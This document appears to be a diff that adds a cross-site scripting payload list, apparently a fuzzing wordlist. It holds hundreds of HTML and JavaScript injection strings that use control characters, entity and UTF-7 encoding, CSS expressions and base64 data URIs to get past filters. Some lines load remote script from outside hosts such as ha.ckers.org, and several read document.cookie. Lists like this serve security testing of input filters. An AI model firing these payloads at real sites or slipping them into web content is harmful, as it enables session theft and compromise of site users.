+<a href="\x0Cjavascript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="\x15javascript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\xA8javascript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="\x16javascript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="\x02javascript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="\x1Bjavascript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="\x06javascript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\xA9javascript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x85javascript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="\x1Ejavascript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x81\x9Fjavascript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="\x1Cjavascript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="javascript\x00:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="javascript\x3A:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="javascript\x09:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="javascript\x0D:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="javascript\x0A:javascript:confirm(1)" id="fuzzelement1">test</a>
+`"'><img src=xxx:x \x0Aonerror=javascript:confirm(1)>
+`"'><img src=xxx:x \x22onerror=javascript:confirm(1)>
+`"'><img src=xxx:x \x0Bonerror=javascript:confirm(1)>
+`"'><img src=xxx:x \x0Donerror=javascript:confirm(1)>
+`"'><img src=xxx:x \x2Fonerror=javascript:confirm(1)>
+`"'><img src=xxx:x \x09onerror=javascript:confirm(1)>
+`"'><img src=xxx:x \x0Conerror=javascript:confirm(1)>
+`"'><img src=xxx:x \x00onerror=javascript:confirm(1)>
+`"'><img src=xxx:x \x27onerror=javascript:confirm(1)>
+`"'><img src=xxx:x \x20onerror=javascript:confirm(1)>
+"`'><script>\x3Bjavascript:confirm(1)</script>
+"`'><script>\x0Djavascript:confirm(1)</script>
+"`'><script>\xEF\xBB\xBFjavascript:confirm(1)</script>
+"`'><script>\xE2\x80\x81javascript:confirm(1)</script>
+"`'><script>\xE2\x80\x84javascript:confirm(1)</script>
+"`'><script>\xE3\x80\x80javascript:confirm(1)</script>
+"`'><script>\x09javascript:confirm(1)</script>
+"`'><script>\xE2\x80\x89javascript:confirm(1)</script>
+"`'><script>\xE2\x80\x85javascript:confirm(1)</script>
+"`'><script>\xE2\x80\x88javascript:confirm(1)</script>
+"`'><script>\x00javascript:confirm(1)</script>
+"`'><script>\xE2\x80\xA8javascript:confirm(1)</script>
+"`'><script>\xE2\x80\x8Ajavascript:confirm(1)</script>
+"`'><script>\xE1\x9A\x80javascript:confirm(1)</script>
+"`'><script>\x0Cjavascript:confirm(1)</script>
+"`'><script>\x2Bjavascript:confirm(1)</script>
+"`'><script>\xF0\x90\x96\x9Ajavascript:confirm(1)</script>
+"`'><script>-javascript:confirm(1)</script>
+"`'><script>\x0Ajavascript:confirm(1)</script>
+"`'><script>\xE2\x80\xAFjavascript:confirm(1)</script>
+"`'><script>\x7Ejavascript:confirm(1)</script>
+"`'><script>\xE2\x80\x87javascript:confirm(1)</script>
+"`'><script>\xE2\x81\x9Fjavascript:confirm(1)</script>
+"`'><script>\xE2\x80\xA9javascript:confirm(1)</script>
+"`'><script>\xC2\x85javascript:confirm(1)</script>
+"`'><script>\xEF\xBF\xAEjavascript:confirm(1)</script>
+"`'><script>\xE2\x80\x83javascript:confirm(1)</script>
+"`'><script>\xE2\x80\x8Bjavascript:confirm(1)</script>
+"`'><script>\xEF\xBF\xBEjavascript:confirm(1)</script>
+"`'><script>\xE2\x80\x80javascript:confirm(1)</script>
+"`'><script>\x21javascript:confirm(1)</script>
+"`'><script>\xE2\x80\x82javascript:confirm(1)</script>
+"`'><script>\xE2\x80\x86javascript:confirm(1)</script>
+"`'><script>\xE1\xA0\x8Ejavascript:confirm(1)</script>
+"`'><script>\x0Bjavascript:confirm(1)</script>
+"`'><script>\x20javascript:confirm(1)</script>
+"`'><script>\xC2\xA0javascript:confirm(1)</script>
+"/><img/onerror=\x0Bjavascript:confirm(1)\x0Bsrc=xxx:x />
+"/><img/onerror=\x22javascript:confirm(1)\x22src=xxx:x />
+"/><img/onerror=\x09javascript:confirm(1)\x09src=xxx:x />
+"/><img/onerror=\x27javascript:confirm(1)\x27src=xxx:x />
+"/><img/onerror=\x0Ajavascript:confirm(1)\x0Asrc=xxx:x />
+"/><img/onerror=\x0Cjavascript:confirm(1)\x0Csrc=xxx:x />
+"/><img/onerror=\x0Djavascript:confirm(1)\x0Dsrc=xxx:x />
+"/><img/onerror=\x60javascript:confirm(1)\x60src=xxx:x />
+"/><img/onerror=\x20javascript:confirm(1)\x20src=xxx:x />
+<script\x2F>javascript:confirm(1)</script>
+<script\x20>javascript:confirm(1)</script>
+<script\x0D>javascript:confirm(1)</script>
+<script\x0A>javascript:confirm(1)</script>
+<script\x0C>javascript:confirm(1)</script>
+<script\x00>javascript:confirm(1)</script>
+<script\x09>javascript:confirm(1)</script>
+`"'><img src=xxx:x onerror\x0B=javascript:confirm(1)>
+`"'><img src=xxx:x onerror\x00=javascript:confirm(1)>
+`"'><img src=xxx:x onerror\x0C=javascript:confirm(1)>
+`"'><img src=xxx:x onerror\x0D=javascript:confirm(1)>
+`"'><img src=xxx:x onerror\x20=javascript:confirm(1)>
+`"'><img src=xxx:x onerror\x0A=javascript:confirm(1)>
+`"'><img src=xxx:x onerror\x09=javascript:confirm(1)>
+<script>javascript:confirm(1)<\x00/script>
+<img src=# onerror\x3D"javascript:confirm(1)" >
+<input onfocus=javascript:confirm(1) autofocus>
+<input onblur=javascript:confirm(1) autofocus><input autofocus>
+<video poster=javascript:javascript:confirm(1)//
+<form id=test onforminput=javascript:confirm(1)><input></form><button form=test
+onformchange=javascript:confirm(1)>X
+<video><source onerror="javascript:javascript:confirm(1)">
+<video onerror="javascript:javascript:confirm(1)"><source>
+<form><button formaction="javascript:javascript:confirm(1)">X
+<body oninput=javascript:confirm(1)><input autofocus>
+<math href="javascript:javascript:confirm(1)">CLICKME</math> <math> <maction
+actiontype="statusline#http://google.com"
+xlink:href="javascript:javascript:confirm(1)">CLICKME</maction> </math>
+<frameset onload=javascript:confirm(1)>
+<table background="javascript:javascript:confirm(1)">
+<!--<img src="--><img src=x onerror=javascript:confirm(1)//">
+<comment><img src="</comment><img src=x onerror=javascript:confirm(1))//">
+<![><img src="]><img src=x onerror=javascript:confirm(1)//">
+<style><img src="</style><img src=x onerror=javascript:confirm(1)//">
+<li style=list-style:url() onerror=javascript:confirm(1)> <div
+style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden
+onload=javascript:confirm(1)></div>
+<head><base href="javascript://"></head><body><a href="/.
+/,javascript:confirm(1)//#">XXX</a></body>
+<SCRIPT FOR=document EVENT=onreadystatechange>javascript:confirm(1)</SCRIPT>
+<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL"
+VALUE="javascript:confirm(1)"></OBJECT>
+<x '="foo"><x foo='><img src=x onerror=javascript:confirm(1)//'>
+<embed src="javascript:confirm(1)">
+<img src="javascript:confirm(1)">
+<image src="javascript:confirm(1)">
+<script src="javascript:confirm(1)">
+<div style=width:1px;filter:glow onfilterchange=javascript:confirm(1)>x
+<? foo="><script>javascript:confirm(1)</script>">
+<! foo="><script>javascript:confirm(1)</script>">
+</ foo="><script>javascript:confirm(1)</script>">
+<? foo="><x foo='?><script>javascript:confirm(1)</script>'>">
+<! foo="[[[Inception]]"><x foo="]foo><script>javascript:confirm(1)</script>">
+<% foo><x foo="%><script>javascript:confirm(1)</script>">
+<div id=d><x xmlns="><iframe onload=javascript:confirm(1)"></div>
+<img \x00src=x onerror="confirm(1)">
+<img \x47src=x onerror="javascript:confirm(1)">
+<img \x11src=x onerror="javascript:confirm(1)">
+<img \x12src=x onerror="javascript:confirm(1)">
+<img\x47src=x onerror="javascript:confirm(1)">
+<img\x10src=x onerror="javascript:confirm(1)">
+<img\x13src=x onerror="javascript:confirm(1)">
+<img\x32src=x onerror="javascript:confirm(1)">
+<img\x47src=x onerror="javascript:confirm(1)">
+<img\x11src=x onerror="javascript:confirm(1)">
+<img \x47src=x onerror="javascript:confirm(1)">
+<img \x34src=x onerror="javascript:confirm(1)">
+<img \x39src=x onerror="javascript:confirm(1)">
+<img \x00src=x onerror="javascript:confirm(1)">
+<img src\x09=x onerror="javascript:confirm(1)">
+<img src\x10=x onerror="javascript:confirm(1)">
+<img src\x13=x onerror="javascript:confirm(1)">
+<img src\x32=x onerror="javascript:confirm(1)">
+<img src\x12=x onerror="javascript:confirm(1)">
+<img src\x11=x onerror="javascript:confirm(1)">
+<img src\x00=x onerror="javascript:confirm(1)">
+<img src\x47=x onerror="javascript:confirm(1)">
+<img src=x\x09onerror="javascript:confirm(1)">
+<img src=x\x10onerror="javascript:confirm(1)">
+<img src=x\x11onerror="javascript:confirm(1)">
+<img src=x\x12onerror="javascript:confirm(1)">
+<img src=x\x13onerror="javascript:confirm(1)">
+<img[a][b][c]src[d]=x[e]onerror=[f]"confirm(1)">
+<img src=x onerror=\x09"javascript:confirm(1)">
+<img src=x onerror=\x10"javascript:confirm(1)">
+<img src=x onerror=\x11"javascript:confirm(1)">
+<img src=x onerror=\x12"javascript:confirm(1)">
+<img src=x onerror=\x32"javascript:confirm(1)">
+<img src=x onerror=\x00"javascript:confirm(1)">
+<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:confirm(1)>XXX</a>
+<img src="x` `<script>javascript:confirm(1)</script>"` `>
+<img src onerror /" '"= alt=javascript:confirm(1)//">
+<title onpropertychange=javascript:confirm(1)></title><title title=>
+<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=javascript:confirm(1)></a>">
+<!--[if]><script>javascript:confirm(1)</script -->
+<!--[if<img src=x onerror=javascript:confirm(1)//]> -->
+<script src="/\%(jscript)s"></script>
+<script src="\\%(jscript)s"></script>
+<object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object> <object
+classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="javascript:confirm(1)"
+style="behavior:url(#x);"><param name=postdomevents /></object>
+<a style="-o-link:'javascript:javascript:confirm(1)';-o-link-source:current">X
+<style>p[foo=bar{}*{-o-link:'javascript:javascript:confirm(1)'}{}*{-o-link-
+source:current}]{color:red};</style>
+<link rel=stylesheet href=data:,*%7bx:expression(javascript:confirm(1))%7d
+<style>@import "data:,*%7bx:expression(javascript:confirm(1))%7D";</style>
+<a style="pointer-events:none;position:absolute;"><a style="position:absolute;"
+onclick="javascript:confirm(1);">XXX</a></a><a href="javascript:javascript:confirm(1)">XXX</a>
+<style>*[{}@import'%(css)s?]</style>X
+<div style="font-family:'foo&#10;;color:red;';">XXX
+<div style="font-family:foo}color=red;">XXX
+<// style=x:expression\28javascript:confirm(1)\29>
+<style>*{x:expression(javascript:confirm(1))}</style>
+<div style=content:url(%(svg)s)></div>
+<div style="list-style:url(http://foo.f)\20url(javascript:javascript:confirm(1));">X
+<div id=d><div style="font-family:'sans\27\3B color\3Ared\3B'">X</div></div>
+<div style="background:url(/f#&#127;oo/;color:red/*/foo.jpg);">X
+<div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X
+<div id="x">XXX</div> <style> #x{font-family:foo[bar;color:green;} #y];color:red;{} </style>
+<x style="background:url('x&#1;;color:red;/*')">XXX</x>
+<script>({set/**/$($){_/**/setter=$,_=javascript:confirm(1)}}).$=eval</script>
+<script>({0:#0=eval/#0#/#0#(javascript:confirm(1))})</script>
+<script>ReferenceError.prototype.__defineGetter__('name',
+function(){javascript:confirm(1)}),x</script>
+<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:confirm(1)')()</script>
+<meta charset="x-imap4-modified-
+utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8Acg
+A9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi
+<meta charset="x-imap4-modified-
+utf7">&<script&S1&TS&1>confirm&A7&(1)&R&UA;&&<&A9&11/script&X&>
+<meta charset="mac-farsi">1⁄4script3⁄4javascript:confirm(1)1⁄4/script3⁄4
+X<x style=`behavior:url(#default#time2)` onbegin=`javascript:confirm(1)` >
+1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)`
+attributename=`inner to=`&lt;img/src=&quot;x&quot;onerror=javascript:confirm(1)&gt;`>
+1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2)
+attributename=innervalues=&lt;img/src=&quot;.&quot;onerror=javascript:confirm(1)&gt;>
+<vmlframe xmlns=urn:schemas-microsoft-com:vml
+style=behavior:url(#default#vml);position:absolute;width:100%;height:100%
+src=%(vml)s#xss></vmlframe>
+1<a href=#><line xmlns=urn:schemas-microsoft-com:vml
+style=behavior:url(#default#vml);position:absolute href=javascript:javascript:confirm(1)
+strokecolor=white strokeweight=1000px from=0 to=1000 /></a>
+<a style="behavior:url(#default#AnchorClick);" folder="javascript:javascript:confirm(1)">XXX</a>
+<x style="behavior:url(%(sct)s)">
+<xml id="xss" src="%(htc)s"></xml> <label dataformatas="html" datasrc="#xss"
+datafld="payload"></label>
+<event-source src="%(event)s" onload="javascript:confirm(1)">
+<a href="javascript:javascript:confirm(1)"><event-source src="data:application/x-dom-event-
+stream,Event:click%0Adata:XXX%0A%0A">
+<div id="x">x</div> <xml:namespace prefix="t"> <import namespace="t"
+implementation="#default#time2"> <t:set attributeName="innerHTML" targetElement="x"
+to="&lt;img&#11;src=x:x&#11;onerror&#11;=javascript:confirm(1)&gt;">
+<script>%(payload)s</script>
+<script src=%(jscript)s></script>
+<script language='javascript' src='%(jscript)s'></script>
+<script>javascript:confirm(1)</script>
+<IMG SRC="javascript:javascript:confirm(1);">
+<IMG SRC=javascript:javascript:confirm(1)>
+<IMG SRC=`javascript:javascript:confirm(1)`>
+<SCRIPT SRC=%(jscript)s?<B>
+<FRAMESET><FRAME SRC="javascript:javascript:confirm(1);"></FRAMESET>
+<BODY ONLOAD=javascript:confirm(1)>
+<BODY ONLOAD=javascript:javascript:confirm(1)>
+<IMG SRC="jav ascript:javascript:confirm(1);">
+<BODY onload!#$%%&()*~+-_.,:;?@[/|\]^`=javascript:confirm(1)>
+<SCRIPT/SRC="%(jscript)s"></SCRIPT>
+<<SCRIPT>%(payload)s//<</SCRIPT>
+<IMG SRC="javascript:javascript:confirm(1)"
+<iframe src=%(scriptlet)s <
+<INPUT TYPE="IMAGE" SRC="javascript:javascript:confirm(1);">
+<IMG DYNSRC="javascript:javascript:confirm(1)">
+<IMG LOWSRC="javascript:javascript:confirm(1)">
+<BGSOUND SRC="javascript:javascript:confirm(1);">
+<LAYER SRC="%(scriptlet)s"></LAYER>
+<LINK REL="stylesheet" HREF="javascript:javascript:confirm(1);">
+<STYLE>@import'%(css)s';</STYLE>
+<META HTTP-EQUIV="Link" Content="<%(css)s>; REL=stylesheet">
+<XSS STYLE="behavior: url(%(htc)s);">
+<STYLE>li {list-style-image: url("javascript:javascript:confirm(1)");}</STYLE><UL><LI>XSS
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:javascript:confirm(1);">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:javascript:confirm(1);">
+<IFRAME SRC="javascript:javascript:confirm(1);"></IFRAME>
+<TABLE BACKGROUND="javascript:javascript:confirm(1)">
+<TABLE><TD BACKGROUND="javascript:javascript:confirm(1)">
+<DIV STYLE="background-image: url(javascript:javascript:confirm(1))">
+<DIV STYLE="width:expression(javascript:confirm(1));">
+<IMG STYLE="xss:expr/*XSS*/ession(javascript:confirm(1))">
+<XSS STYLE="xss:expression(javascript:confirm(1))">
+<STYLE TYPE="text/javascript">javascript:confirm(1);</STYLE>
+<STYLE>.XSS{background-image:url("javascript:javascript:confirm(1)");}</STYLE><A CLASS=XSS></A>
+<STYLE type="text/css">BODY{background:url("javascript:javascript:confirm(1)")}</STYLE>
+<!--[if gte IE 4]><SCRIPT>javascript:confirm(1);</SCRIPT><![endif]-->
+<BASE HREF="javascript:javascript:confirm(1);//">
+<OBJECT TYPE="text/x-scriptlet" DATA="%(scriptlet)s"></OBJECT>
+<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url
+value=javascript:javascript:confirm(1)></OBJECT>
+</HEAD>+ADw-SCRIPT+AD4-%(payload)s;+ADw-/SCRIPT+AD4-
+<form id="test" /><button form="test" formaction="javascript:javascript:confirm(1)">X
+<body
+onscroll=javascript:confirm(1)><
+<input autofocus>
+<P STYLE="behavior:url('#default#time2')" end="0" onEnd="javascript:confirm(1)">
+<STYLE>@import'%(css)s';</STYLE>
+<STYLE>a{background:url('s1' 's2)}@import javascript:javascript:confirm(1);');}</STYLE>
+<meta charset= "x-imap4-modified-
+utf7"&&>&&<script&&>javascript:confirm(1)&&;&&<&&/script&&>
+<SCRIPT onreadystatechange=javascript:javascript:confirm(1);></SCRIPT>
+<style onreadystatechange=javascript:javascript:confirm(1);></style>
+<embed code=%(scriptlet)s></embed>
+<embed code=javascript:javascript:confirm(1);></embed>
+<embed src=%(jscript)s></embed>
+<frameset onload=javascript:javascript:confirm(1)></frameset>
+<object onerror=javascript:javascript:confirm(1)>
+<embed type="image" src=%(scriptlet)s></embed>
+<XML ID=I><X><C><![CDATA[<IMG
+SRC="javas]]<![CDATA[cript:javascript:confirm(1);">]]</C><X></xml>
+<IMG SRC=&{javascript:confirm(1);};>
+<a href="jav&#65ascript:javascript:confirm(1)">test1</a>
+<a href="jav&#97ascript:javascript:confirm(1)">test1</a>
+<embed width=500 height=500 code="data:text/html,<script>%(payload)s</script>"></embed>
+<iframe
+srcdoc="&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:al
+ert(1)&amp;gt;>">
+';confirm(String.fromCharCode(88,83,83))//';confirm(String.fromCharCode(88,83,83))//";
+confirm(String.fromCharCode(88,83,83))//";confirm(String.fromCharCode(88,83,83))//--
+></SCRIPT>">'><SCRIPT>confirm(String.fromCharCode(88,83,83))</SCRIPT>
+'';!--"<XSS>=&{()}
+<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
+<IMG SRC="javascript:confirm('XSS');">
+<IMG SRC=javascript:confirm('XSS')>
+<IMG SRC=JaVaScRiPt:confirm('XSS')>
+<IMG SRC=javascript:confirm("XSS")>
+<IMG SRC=`javascript:confirm("RSnake says, 'XSS'")`>
+<a onmouseover="confirm(document.cookie)">xxs link</a>
+<a onmouseover=confirm(document.cookie)>xxs link</a>
+<IMG """><SCRIPT>confirm("XSS")</SCRIPT>">
+<IMG SRC=javascript:confirm(String.fromCharCode(88,83,83))>
+<IMG SRC=# onmouseover="confirm('xxs')">
+<IMG SRC= onmouseover="confirm('xxs')">
+<IMG onmouseover="confirm('xxs')">
+<IMG
+SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101
+;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<IMG
+SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&
+#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#00000
+40&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<IMG
+SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x
+72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<IMG SRC="jav ascript:confirm('XSS');">
+<IMG SRC="jav&#x09;ascript:confirm('XSS');">
+<IMG SRC="jav&#x0A;ascript:confirm('XSS');">
+<IMG SRC="jav&#x0D;ascript:confirm('XSS');">
+perl -e 'print "<IMG SRC=java\0script:confirm(\"XSS\")>";' > out
+<IMG SRC=" &#14; javascript:confirm('XSS');">
+<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm("XSS")>
+<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<<SCRIPT>confirm("XSS");//<</SCRIPT>
+<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
+<SCRIPT SRC=//ha.ckers.org/.j>
+<IMG SRC="javascript:confirm('XSS')"
+\";confirm('XSS');//
+</TITLE><SCRIPT>confirm("XSS");</SCRIPT>
+<INPUT TYPE="IMAGE" SRC="javascript:confirm('XSS');">
+<BODY BACKGROUND="javascript:confirm('XSS')">
+<IMG DYNSRC="javascript:confirm('XSS')">
+<IMG LOWSRC="javascript:confirm('XSS')">
+<STYLE>li {list-style-image: url("javascript:confirm('XSS')");}</STYLE><UL><LI>XSS>
+<IMG SRC='vbscript:msgbox("XSS")'>
+<IMG SRC="livescript:[code]">
+<BODY ONLOAD=confirm('XSS')>
+<BGSOUND SRC="javascript:confirm('XSS');">
+<LINK REL="stylesheet" HREF="javascript:confirm('XSS');">
+<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
+<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
+<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
+<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
+<STYLE>@im\port'\ja\vasc\ript:confirm("XSS")';</STYLE>
+<IMG STYLE="xss:expr/*XSS*/ession(confirm('XSS'))">
+exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(confirm("XSS"))'>
+<STYLE TYPE="text/javascript">confirm('XSS');</STYLE>
+<STYLE>.XSS{background-image:url("javascript:confirm('XSS')");}</STYLE><A CLASS=XSS></A>
+<STYLE type="text/css">BODY{background:url("javascript:confirm('XSS')")}</STYLE>
+<STYLE type="text/css">BODY{background:url("javascript:confirm('XSS')")}</STYLE>
+<XSS STYLE="xss:expression(confirm('XSS'))">
+<XSS STYLE="behavior: url(xss.htc);">
+1⁄4script3⁄4confirm(¢XSS¢)1⁄4/script3⁄4
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:confirm('XSS');">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html
+base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:confirm('XSS');">
+<IFRAME SRC="javascript:confirm('XSS');"></IFRAME>
+<IFRAME SRC=# onmouseover="confirm(document.cookie)"></IFRAME>
+<FRAMESET><FRAME SRC="javascript:confirm('XSS');"></FRAMESET>
+<TABLE BACKGROUND="javascript:confirm('XSS')">
+<TABLE><TD BACKGROUND="javascript:confirm('XSS')">
+<DIV STYLE="background-image: url(javascript:confirm('XSS'))">
+<DIV STYLE="background-
+image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\00
+61\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
+<DIV STYLE="background-image: url(&#1;javascript:confirm('XSS'))">
+<DIV STYLE="width: expression(confirm('XSS'));">
+<BASE HREF="javascript:confirm('XSS');//">
+<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
+<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH
+A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv
+MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs
+aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw
+IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh
+TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
+<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
+<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT
+SRC=http://ha.ckers.org/xss.js></SCRIPT>'"-->
+<? echo('<SCR)';echo('IPT>confirm("XSS")</SCRIPT>'); ?>
+<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
+Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>confirm('XSS')</SCRIPT>">
+<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7">
+</HEAD>+ADw-SCRIPT+AD4-confirm('XSS');+ADw-/SCRIPT+AD4-
+<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<A HREF="http://66.102.7.147/">XSS</A>
+<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
+<A HREF="http://1113982867/">XSS</A>
+<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
+<A HREF="http://0102.0146.0007.00000223/">XSS</A>
+<A HREF="htt p://6 6.000146.0x7.147/">XSS</A>
+<iframe src="&Tab;javascript:confirm(1)&Tab;">
+<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
+<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+<sVg><scRipt >confirm&lpar;1&rpar; {Opera}
+<img/src=`` onerror=this.onerror=confirm(1)
+<form><isindex formaction="javascript&colon;confirm(1)"
+<img src=``&NewLine; onerror=confirm(1)&NewLine;
+<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>
+<ScRipT 5-0*3+9/3=>confirm(1)</ScRipT giveanswerhere=?
+<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
+<script /**/>/**/confirm(1)/**/</script /**/
+&#34;&#62;<h1/onmouseover='\u0061lert(1)'>
+<iframe/src="data:text/html,<svg &#111;&#110;load=confirm(1)>">
+<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; confirm(1)" http-equiv="refresh"/>
+<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
+<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
+<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
+<iframe src=javascript&colon;confirm&lpar;document&period;location&rpar;>
+<form><a href="javascript:\u0061lert&#x28;1&#x29;">X
+</script><img/*/src="worksinchrome&colon;confirm&#x28;1&#x29;"/*/onerror='eval(src)'>
+<img/&#09;&#10;&#11; src=`~` onerror=confirm(1)>
+<form><iframe &#09;&#10;&#11; src="javascript&#58;confirm(1)"&#11;&#10;&#09;;>
+<a href="data:application/x-x509-user-
+cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;
+>X</a
+http://www.google<script .com>confirm(document.location)</script
+<a&#32;href&#61;&#91;&#00;&#93;"&#00;
+onmouseover=confirm&#40;1&#41;&#47;&#47;">XYZ</a
+<img/src=@&#32;&#13; onerror = confirm('&#49;')
+<style/onload=confirm&#40;'&#88;&#83;&#83;'&#41;
+<script ^__^>confirm(String.fromCharCode(49))</script ^__^
+</style &#32;><script &#32; :-(>/**/confirm(document.location)/**/</script &#32; :-(
+&#00;</form><input type&#61;"date" onfocus="confirm(1)">
+<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>
+<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script
+/***/
+<iframe srcdoc='&lt;body onload=confirm&lpar;1&rpar;&gt;'>
+<a href="javascript:void(0)" onmouseover=&NewLine;javascript:confirm(1)&NewLine;>X</a>
+<script ~~~>confirm(0%0)</script ~~~>
+<style/onload=&lt;!--&#09;&gt;&#10;confirm&#10;&lpar;1&rpar;>
+<///style///><span %2F onmousemove='confirm&lpar;1&rpar;'>SPAN
+<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;confirm(1)
+&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
+&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
+<marquee onstart='javascript:confirm&#x28;1&#x29;'>^__^
+<div/style="width:expression(confirm(1))">X</div> {IE7}
+<iframe// src=javaSCRIPT&colon;confirm(1)
+//<form/action=javascript&#x3A;confirm&lpar;document&period;cookie&rpar;><input/type='submit'>
+//
